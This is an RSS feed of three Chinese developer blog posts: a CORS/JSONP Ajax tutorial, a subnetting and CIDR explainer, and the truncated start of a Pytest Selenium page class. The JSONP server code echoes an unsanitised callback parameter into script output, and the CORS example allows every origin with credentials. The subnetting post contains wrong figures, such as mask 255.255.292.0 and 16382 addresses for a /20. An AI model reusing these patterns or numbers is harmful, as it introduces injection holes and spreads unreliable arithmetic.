<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Ajax跨域问题及解决方案 - 炭烧生蚝</title>
<link>http://www.cnblogs.com/tanshaoshenghao/p/10799042.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tanshaoshenghao/p/10799042.html</guid>
<description>&lt;ul&gt;&lt;li&gt;做两个简单的小项目复现Ajax跨域问题. 后端语言使用Java&lt;/li&gt;
&lt;li&gt;首先是一个简单的订单系统, 通过访问&lt;code&gt;/loadOrderList&lt;/code&gt;, 最终以json串形式返回订单集合. 该项目使用Tomcat发布在7070端口.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@RequestMapping(&quot;/loadOrderList&quot;)
@ResponseBody
public List&amp;lt;Order&amp;gt; loadOrderList(String uid){
    //模拟订单数据
    Order o1 = new Order();
    o1.setId(&quot;111&quot;);
    o1.setTotal(333.33);
    o1.setDate(&quot;2019-4-29&quot;);

    Order o2 = new Order();
    o2.setId(&quot;222&quot;);
    o2.setTotal(444.44);
    o2.setDate(&quot;2019-5-29&quot;);

    Order o3 = new Order();
    o3.setId(&quot;333&quot;);
    o3.setTotal(555.55);
    o3.setDate(&quot;2019-6-29&quot;);

    List&amp;lt;Order&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
    list.add(o1);
    list.add(o2);
    list.add(o3);

    return list;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;在另一个项目中做一个向订单系统发送一个ajax请求, 获取订单集合. 该项目使用Tomcat插件发布在9090端口.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//index.jsp

&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; src=&quot;https://code.jquery.com/jquery-1.11.3.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
        function sendAjax() {
            $.post(&quot;http://localhost:7070/order/loadOrderList&quot;, &quot;uid=1234&quot;, function (data) {
                alert(data);
            });
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;a href=&quot;javascript:sendAjax()&quot;&amp;gt;sendAjax&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;ul&gt;&lt;li&gt;点击&lt;code&gt;sendAjax&lt;/code&gt;超链接向订单系统发送ajax请求.&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190430191117328.png&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/li&gt;
&lt;li&gt;通过开发者工具发现虽然服务器以状态码200响应回来, 但是控制台却报错了.&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190430191353533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTM1Nzc2Nw==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190430193153869.png&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/li&gt;
&lt;li&gt;这就是Ajax跨域出错的一种表现, 下面分析原因.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;&lt;li&gt;Ajax跨域问题是由浏览器的同源策略造成的, 首先要理解&lt;code&gt;源&lt;/code&gt;这个概念.&lt;/li&gt;
&lt;li&gt;我们可以通过协议+域名+端口确定一个源. 在上面的示例中, 你可以把一个项目理解为一个源. Ajax请求可以对源内的资源发起访问, 但是不同源之间进行Ajax就会有问题.&lt;/li&gt;
&lt;li&gt;当向不同源的资源发起Ajax请求时, 浏览器会加上&lt;code&gt;Origin&lt;/code&gt;字段来标识源&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 8
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: localhost:7070
Origin: http://localhost:9090   协议+域名+端口&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;服务器会根据&lt;code&gt;Origin&lt;/code&gt;字段决定是否同意这次请求, 如果&lt;code&gt;Origin&lt;/code&gt;指定的源不在许可范围内, 服务器会返回一个不带有&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;字段的响应. 浏览器解析时发现缺少了这个字段, 就会报错. 这种错误不能通过状态码识别, 因为状态码很有可能就是200(见上面的案例).&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;&lt;li&gt;下面介绍最常用Ajax跨域解决方案.&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;一.-在服务端添加响应头access-control-allow-origin&quot;&gt;一. 在服务端添加响应头&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;既然我们已经知道了Ajax跨域失败是因为响应中缺少了响应头&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;, 那么就想办法加上去.&lt;/li&gt;
&lt;li&gt;以Java项目为例, 在后端我们使用&lt;code&gt;CORSFilter&lt;/code&gt;过滤器加上该响应头.&lt;/li&gt;
&lt;li&gt;(假设是Maven项目), 首先在&lt;code&gt;pom.xml&lt;/code&gt;中添加坐标&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;com.thetransactioncompany&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;cors-filter&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.5&amp;lt;/version&amp;gt;
    &amp;lt;scope&amp;gt;runtime&amp;lt;/scope&amp;gt;
&amp;lt;/dependency&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;然后在&lt;code&gt;web.xml&lt;/code&gt;中对过滤器进行配置.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;    &amp;lt;filter&amp;gt;
        &amp;lt;filter-name&amp;gt;CORS&amp;lt;/filter-name&amp;gt;
        &amp;lt;filter-class&amp;gt;com.thetransactioncompany.cors.CORSFilter&amp;lt;/filter-class&amp;gt;
        &amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;cors.allowOrigin&amp;lt;/param-name&amp;gt;&amp;lt;!--这个标签是关键, *代表所有源都能访问--&amp;gt;
            &amp;lt;param-value&amp;gt;*&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;cors.supportedMethods&amp;lt;/param-name&amp;gt;
            &amp;lt;param-value&amp;gt;GET, POST, HEAD, PUT, DELETE&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;cors.supportedHeaders&amp;lt;/param-name&amp;gt;
            &amp;lt;param-value&amp;gt;Accept, Origin, X-Requested-With, Content-Type, Last-Modified&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;cors.exposedHeaders&amp;lt;/param-name&amp;gt;
            &amp;lt;param-value&amp;gt;Set-Cookie&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;cors.supportsCredentials&amp;lt;/param-name&amp;gt;
            &amp;lt;param-value&amp;gt;true&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
    &amp;lt;/filter&amp;gt;

    &amp;lt;filter-mapping&amp;gt;
        &amp;lt;filter-name&amp;gt;CORS&amp;lt;/filter-name&amp;gt;
        &amp;lt;url-pattern&amp;gt;/*&amp;lt;/url-pattern&amp;gt;
    &amp;lt;/filter-mapping&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;ul&gt;&lt;li&gt;配置后重启订单项目, 再次发起Ajax请求可以看到成功返回数据, 响应头中包含了&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;, 值为发起Ajax请求的源.&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190430194918105.png&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190430195151524.png&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt; &lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;二.-使用jsonp解决&quot;&gt;二. 使用JSONP解决&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;上面直接通过过滤器添加响应头的方法可以说是对症下药, 那么还有没有什么偏方呢?&lt;/li&gt;
&lt;li&gt;还真的有. 在jsp文件中经常通过通过&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签引入一段js代码, 这段代码通常来源于网络, 也就是不同源. 那么我们不妨通过&lt;code&gt;&amp;lt;srcipt&amp;gt;&lt;/code&gt;标签完成Ajax请求, 这样便顺带解决了跨域问题.&lt;/li&gt;
&lt;li&gt;下面还是沿用上面的案例进行演示.&lt;/li&gt;
&lt;li&gt;我们对发送ajax的jsp进行修改&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; src=&quot;https://code.jquery.com/jquery-1.11.3.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script&amp;gt;
        function doCallBack(data){
            var str = JSON.stringify(data);
            alert(str);
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;script src=&quot;http://localhost:7070/order/loadOrderList3?uid=111&amp;amp;callBack=doCallBack&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;上面的代码中, 我们首先定义了&lt;code&gt;doCallBack()&lt;/code&gt;函数, 它接收一个字符串参数, 并且会把接收到的字符串显示出来.&lt;/li&gt;
&lt;li&gt;然后在&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;标签中编写&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签, 我们将通过&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签请求订单系统, 订单系统将会返回一段js代码, 这段js代码会调用&lt;code&gt;doCallBack()&lt;/code&gt;方法.&lt;/li&gt;
&lt;li&gt;为了能够拼接出&lt;code&gt;doCallBack(字符串参数...)&lt;/code&gt;js代码, 我们在订单系统中作如下操作.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@RequestMapping(&quot;/loadOrderList3&quot;)
@ResponseBody
public String loadOrderList3(String uid, String callBack){
    //模拟订单数据
    Order o1 = new Order();
    o1.setId(&quot;111&quot;);
    o1.setTotal(333.33);
    o1.setDate(&quot;2019-4-29&quot;);

    Order o2 = new Order();
    o2.setId(&quot;222&quot;);
    o2.setTotal(444.44);
    o2.setDate(&quot;2019-5-29&quot;);

    Order o3 = new Order();
    o3.setId(&quot;333&quot;);
    o3.setTotal(555.55);
    o3.setDate(&quot;2019-6-29&quot;);

    List&amp;lt;Order&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
    list.add(o1);
    list.add(o2);
    list.add(o3);

    //拼接js代码
    String result = callBack + &quot;(&quot; + JSON.toJSONString(list) + &quot;)&quot;;
    return result;
}&lt;/code&gt;
&lt;/pre&gt;

&lt;ul&gt;&lt;li&gt;这个想法是不是很妙? 明白这个原理之后, 我们可以使用jQuery方便进行JSONP操作, 在上面的代码中我们人为指定了一个名为&lt;code&gt;doCallBack&lt;/code&gt;的函数, 而jQuery会随机用时间戳生成一个函数名, 原理和上面是一样的.&lt;/li&gt;
&lt;li&gt;所以完成一开时点击超链接发送Ajax请求只需要如下几步.&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;&amp;lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot; src=&quot;https://code.jquery.com/jquery-1.11.3.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script&amp;gt;
        function sendAjax(){
            $.getJSON(&quot;http://localhost:7070/order/loadOrderList3?callBack=?&quot;,&quot;uid=111&quot;,
            function (data) {
                var str = JSON.stringify(data);
                alert(str);
            });
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;a href=&quot;javascript:sendAjax()&quot;&amp;gt;sendAjax&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;上面两种解决办法在思路上有着本质的不同. 方案一抓住&lt;code&gt;CORS&lt;/code&gt;跨域访问问题的本质, 在后端加上响应头解决跨域问题. 方案二&lt;code&gt;JSONP&lt;/code&gt;利用的是&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签能够跨域获取js代码的特性, 绕过跨域问题.&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Tue, 30 Apr 2019 23:10:00 +0000</pubDate>
<dc:creator>炭烧生蚝</dc:creator>
<og:description>[TOC] 复现Ajax跨域问题 做两个简单的小项目复现Ajax跨域问题. 后端语言使用Java 首先是一个简单的订单系统, 通过访问 , 最终以json串形式返回订单集合. 该项目使用Tomcat发</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/tanshaoshenghao/p/10799042.html</dc:identifier>
</item>
<item>
<title>子网划分和无分类编址 - 农码关山北</title>
<link>http://www.cnblogs.com/dslx/p/10795238.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dslx/p/10795238.html</guid>
<description>&lt;h3&gt;概述&lt;/h3&gt;
&lt;p&gt;网络标识相同的计算机必须属于同一个网络，一个B类的IP网络，在理论上是允许六万多台计算机连接的但在实际网络结构中这种一般是不存在的，这样就浪费了资源，套句时髦的话，为解决日益增长的网络设备IP需求与日益减少的网络IP的矛盾和日益增加的网络号与有限空间存储路由的矛盾，因此子网划分应运而生。&lt;/p&gt;
&lt;h3&gt;子网&lt;/h3&gt;
&lt;p&gt;在一个有许多物理网络的单位，可以将所属的物理网络划分为N个子网。至于划分几个，这要看单位自己内部需求了，除了本单位外，在外部网络看来，你还是只有一个网络，也就是说这个子网对网络来说是不可见的。而它的划分方法是从网络的主机号借用几位作为子网号，所以主机号也要相应减小同样的位数，在IP和网络分层提过，分类的IP是两级的地址（网络号，主机号），但如今对本单位来说，这个IP地址已经变成三级IP地址了（网络号，子网号，主机号）。现在，有个数据包从外部网络要发给本单位C号子网的某个主机，它会先根据数据报文中目的IP的网络号（划分子网，只是把IP的地址的主机号在划分）找到连接在单位网络上的路由器，然后这个路由器在收到数据包后，按目的网络号和子网号找到这个C号子网，在找到目标主机，然后把数据包交给目的主机。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1333075/201904/1333075-20190430134951299-1265572425.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但现在出现了一个问题，根据数据包里的目的IP地址并不包含子网划分的信息，就是这个路由器怎么会知道是C号子网，而不会是A,B号子网哪。如果有网络的基础知识的话，一定听过一个词，子网掩码。&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;子网掩码&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;现在因特网规定，所有的网络都必须使用子网掩码，路由器的路由表也必须有子网掩码这一栏。即使你不划分子网，那也必须有子网掩码（默认子网掩码）。子网掩码用二进制标识，也是一个32位的数字，对应IP地址网络标识部分的位（网络号 + 子网号）全部为1，对应IP地址主机标识的部分都为0，现在，一个IP地址就可以不受自己类别限制，而可以用这样的子网掩码，自由的定位自己的网络标识长度。子网掩码不能单独使用，必须结合IP地址，它屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是局域网还是远程网。141.14.72.24/18（CIDR斜线记法）  这个18 就告诉我们网络号有18位，即18个1&lt;/p&gt;
&lt;p&gt;11111111    11111111  01001000  00000000  IP：141.14.72.24&lt;/p&gt;
&lt;p&gt;11111111    11111111  11000000  00000000 掩码为 255.255.292.0&lt;/p&gt;
&lt;p&gt;11111111    11111111  01000000 00000000  网络地址：141.14.64.0&lt;/p&gt;
&lt;p&gt;注意：用相同的IP地址和不同的子网掩码可以得出相同的网络地址，但是不同的掩码的效果是不同的，因为它们子网号和主机号位数是不一样的，所以可划分的子网数和每个子网最大主机数也都是不一样的。&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;CIDR&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;给某个网络分配3个C类地址，ISP（地址网络提供商）的路由表就会有三条路由条目，路由表的不断变大，寻址效率不断下降。而且虽然划分子网在一定程序上缓解了IP地址紧张的问题，但最终也将很快全部耗尽，为了解决这些问题和缓解IP地址紧张。于是出现一个折中的办法，那就是无类域间路由，简称CIDR。就以把这三个网段 198.168.1.0    198.168.2.0  198.168.3.0 汇聚成一条路由 198.168.0.0/16（路由聚合）,这样ISP的路由表就只记录了一条198.168.0.0/16这一条路由，减少了路由表的条目，但若是ISP连接了一个172.168.96.0的网段，这些网络路由就没办法汇聚。CIRD节省了存储空间加快了查询速度。所以，现在都是用CIDR表示，就是说网络位的个数可以任意指定，同时也兼容早期IP划分的方法。它消除了以前A，B，C，D类地址的和划分子网的概念，使IP地址又从三级（网络号，子网号，主机号）又变回两级编址，不同的是，现在的两级编址是无分类的两级，这样就可以更有效分配IP地址了。&lt;/p&gt;
&lt;p&gt;对应位数的子网掩码&lt;/p&gt;
&lt;p&gt;255.0.0.0 /8&lt;br/&gt;255.128.0.0 /9&lt;br/&gt;255.192.0.0 /10&lt;br/&gt;255.224.0.0 /11&lt;br/&gt;255.240.0.0 /12&lt;br/&gt;255.248.0.0 /13&lt;br/&gt;255.252.0.0 /14&lt;br/&gt;255.254.0.0 /15&lt;br/&gt;255.255.0.0 /16&lt;br/&gt;255.255.128.0 /17&lt;br/&gt;255.255.192.0 /18&lt;br/&gt;255.255.224.0 /19&lt;br/&gt;255.255.240.0 /20&lt;br/&gt;255.255.248.0 /21&lt;br/&gt;255.255.252.0 /22&lt;br/&gt;255.255.254.0 /23&lt;br/&gt;255.255.255.0 /24&lt;br/&gt;255.255.255.128 /25&lt;br/&gt;255.255.255.192 /26&lt;br/&gt;255.255.255.224 /27&lt;br/&gt;255.255.255.240 /28&lt;br/&gt;255.255.255.248 /29&lt;br/&gt;255.255.255.252 /30&lt;/p&gt;
&lt;p&gt;CIDR表示法给出任何的一个IP地址，就可以从这个IP地址中得知一个CIDR地址块，我们随意给出一个代码块  128.101.74.7/20&lt;/p&gt;
&lt;p&gt;10000000  01100101  01001010  00000111    IP地址&lt;/p&gt;
&lt;p&gt;11111111   11111111    11110000   00000000   子网掩码  255.255.240.0&lt;/p&gt;
&lt;p&gt;10000000 01100101   01000000  00000000   最小地址  128.101.64.0&lt;/p&gt;
&lt;p&gt;10000000 01100101   01001111  11111111      最大地址  128.101.79.255&lt;/p&gt;
&lt;p&gt;因此，这个CIDR地址块可以指派（79-64+1）*  256 - 2 = 4094个地址（去除广播地址和网络号），也就大大缓解了IP地址的压力。&lt;/p&gt;
&lt;h3&gt;子网划分&lt;/h3&gt;
&lt;p&gt;在进行子网划分前，要首先明确一个问题，要划分几个子网。&lt;/p&gt;
&lt;p&gt;随机对一个网络地址块156.36.23.154/18，进行划分，假设要划分4个子网。&lt;/p&gt;
&lt;p&gt;第一步：默认的子网掩码是 11111111  11111111 11000000   00000000&lt;/p&gt;
&lt;p&gt;现在要划分两个子网，2的平方刚好是4，说明子网的网络位是2位，14 - 2 = 12 就是子网的主机位&lt;/p&gt;
&lt;p&gt;第二步：现在的子网掩码变为  11111111   11111111  11110000  00000000&lt;/p&gt;
&lt;p&gt;换成子网掩码则为  255.255.240.0，可用地址有16382个&lt;/p&gt;
&lt;p&gt;第一个子网地址  156.36.0.0&lt;/p&gt;
&lt;p&gt;第二个子网地址  156.36.16.0&lt;/p&gt;
&lt;p&gt;第三个子网地址  156.36.32.0&lt;/p&gt;
&lt;p&gt;第四个子网地址   156.36.48.0&lt;/p&gt;
&lt;p&gt;======================================================&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如发现错误，请及时留言，lz及时修改，避免误导后来者。感谢！！！&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 30 Apr 2019 18:14:00 +0000</pubDate>
<dc:creator>农码关山北</dc:creator>
<og:description>概述 网络标识相同的计算机必须属于同一个网络，一个B类的IP网络，在理论上是允许六万多台计算机连接的但在实际网络结构中这种一般是不存在的，这样就浪费了资源，套句时髦的话，为解决日益增长的网络设备IP需</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dslx/p/10795238.html</dc:identifier>
</item>
<item>
<title>Pytest UI自动化测试实战实例 - linux超</title>
<link>http://www.cnblogs.com/linuxchao/p/linuxchao-pytest-Actual.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/linuxchao/p/linuxchao-pytest-Actual.html</guid>
<description>&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;  2&lt;/span&gt; &lt;span&gt;------------------------------------
&lt;/span&gt;&lt;span&gt;  3&lt;/span&gt; &lt;span&gt;@Time : 2019/4/20 8:45
&lt;/span&gt;&lt;span&gt;  4&lt;/span&gt; &lt;span&gt;@Auth : linux超
&lt;/span&gt;&lt;span&gt;  5&lt;/span&gt; &lt;span&gt;@File : BasePage.py
&lt;/span&gt;&lt;span&gt;  6&lt;/span&gt; &lt;span&gt;@IDE  : PyCharm
&lt;/span&gt;&lt;span&gt;  7&lt;/span&gt; &lt;span&gt;@Motto: Real warriors,dare to face the bleak warning,dare to face the incisive error!
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt; &lt;span&gt;------------------------------------
&lt;/span&gt;&lt;span&gt;  9&lt;/span&gt; &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 10&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt; 11&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; selenium.webdriver.support &lt;span&gt;import&lt;/span&gt;&lt;span&gt; expected_conditions as EC
&lt;/span&gt;&lt;span&gt; 12&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; selenium.webdriver.support.wait &lt;span&gt;import&lt;/span&gt;&lt;span&gt; WebDriverWait as wd
&lt;/span&gt;&lt;span&gt; 13&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.by &lt;span&gt;import&lt;/span&gt;&lt;span&gt; By
&lt;/span&gt;&lt;span&gt; 14&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; selenium.common.exceptions &lt;span&gt;import&lt;/span&gt;&lt;span&gt; NoSuchWindowException, TimeoutException, \
&lt;/span&gt;&lt;span&gt; 15&lt;/span&gt; &lt;span&gt;    NoAlertPresentException, NoSuchFrameException
&lt;/span&gt;&lt;span&gt; 16&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt; 17&lt;/span&gt; 
&lt;span&gt; 18&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; util.clipboard &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ClipBoard
&lt;/span&gt;&lt;span&gt; 19&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; util.keyboard &lt;span&gt;import&lt;/span&gt;&lt;span&gt; KeyBoard
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; util.parseConFile &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ParseConFile
&lt;/span&gt;&lt;span&gt; 21&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; util.parseExcelFile &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ParseExcel
&lt;/span&gt;&lt;span&gt; 22&lt;/span&gt; 
&lt;span&gt; 23&lt;/span&gt; 
&lt;span&gt; 24&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BasePage(object):
&lt;/span&gt;&lt;span&gt; 25&lt;/span&gt;     &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 26&lt;/span&gt; &lt;span&gt;    结合显示等待封装一些selenium 内置方法
&lt;/span&gt;&lt;span&gt; 27&lt;/span&gt;     &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 28&lt;/span&gt;     cf =&lt;span&gt; ParseConFile()
&lt;/span&gt;&lt;span&gt; 29&lt;/span&gt;     excel =&lt;span&gt; ParseExcel()
&lt;/span&gt;&lt;span&gt; 30&lt;/span&gt; 
&lt;span&gt; 31&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;(self, driver, outTime=30&lt;span&gt;):
&lt;/span&gt;&lt;span&gt; 32&lt;/span&gt;         self.byDic =&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 33&lt;/span&gt;         &lt;span&gt;'&lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: By.ID,
&lt;/span&gt;&lt;span&gt; 34&lt;/span&gt;         &lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: By.NAME,
&lt;/span&gt;&lt;span&gt; 35&lt;/span&gt;         &lt;span&gt;'&lt;/span&gt;&lt;span&gt;class_name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: By.CLASS_NAME,
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt;         &lt;span&gt;'&lt;/span&gt;&lt;span&gt;xpath&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: By.XPATH,
&lt;/span&gt;&lt;span&gt; 37&lt;/span&gt;         &lt;span&gt;'&lt;/span&gt;&lt;span&gt;link_text&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: By.LINK_TEXT
&lt;/span&gt;&lt;span&gt; 38&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt; 39&lt;/span&gt;         self.driver =&lt;span&gt; driver
&lt;/span&gt;&lt;span&gt; 40&lt;/span&gt;         self.outTime =&lt;span&gt; outTime
&lt;/span&gt;&lt;span&gt; 41&lt;/span&gt; 
&lt;span&gt; 42&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; findElement(self, by, locator):
&lt;/span&gt;&lt;span&gt; 43&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt; 44&lt;/span&gt; &lt;span&gt;        find alone element
